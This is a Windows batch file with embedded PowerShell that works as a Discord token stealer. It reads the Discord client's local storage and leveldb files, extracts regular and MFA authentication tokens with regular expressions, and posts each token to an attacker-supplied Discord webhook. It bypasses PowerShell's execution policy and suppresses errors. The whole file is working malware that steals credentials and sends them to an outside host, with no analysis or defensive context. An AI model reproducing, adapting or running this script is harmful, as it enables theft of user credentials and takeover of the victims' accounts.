@echo off
setlocal enabledelayedexpansion

:: Replace this with your actual webhook URL
set WEBHOOK=https://discord.com/api/webhooks/your-id/your-token

:: Embedded PowerShell payload
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$w='%WEBHOOK%'; ^
$p=@($env:APPDATA+'\discord\Local Storage\leveldb',$env:APPDATA+'\discordcanary\Local Storage\leveldb',$env:APPDATA+'\discordptb\Local Storage\leveldb'); ^
$r=@('[\w-]{24}\.[\w-]{6}\.[\w-]{27}','mfa\.[\w-]{84}'); ^
$t=@(); ^
foreach($b in $p){ ^
  if(Test-Path $b){ ^
    Get-ChildItem $b -Include *.log,*.ldb | ForEach-Object { ^
      $c=Get-Content $_.FullName -Raw -EA 0; ^
      foreach($q in $r){ ^
        if($c -match $q){ $t+=$matches[0] } ^
      } ^
    }; ^
    $s=Join-Path (Split-Path $b -Parent) 'Local Storage\https_discord.com_0.localstorage'; ^
    if(Test-Path $s){ ^
      try{ ^
        $conn=New-Object System.Data.SQLite.SQLiteConnection('Data Source='+$s); ^
        $conn.Open(); ^
        $cmd=$conn.CreateCommand(); ^
        $cmd.CommandText='SELECT key,value FROM ItemTable'; ^
        $rdr=$cmd.ExecuteReader(); ^
        while($rdr.Read()){ ^
          $val=$rdr.GetString(1); ^
          foreach($q in $r){ ^
            if($val -match $q){ $t+=$matches[0] } ^
          } ^
        } ^
        $conn.Close() ^
      }catch{} ^
    } ^
  } ^
}; ^
foreach($tok in $t){ ^
  $body=@{content='**Token**';embeds=@{title='Discord Token';color=0xFF0000;fields=@{name='Token';value='``'+$tok+'``';inline=$false},@{name='Timestamp';value=(Get-Date -Format o);inline=$false}}}|ConvertTo-Json -Compress; ^
  try{ ^
    Invoke-RestMethod -Uri $w -Method Post -Body $body -ContentType 'application/json' -EA Stop; ^
    Write-Host '[+] Sent' ^
  }catch{ ^
    Write-Host '[-] Fail' ^
  } ^
}"
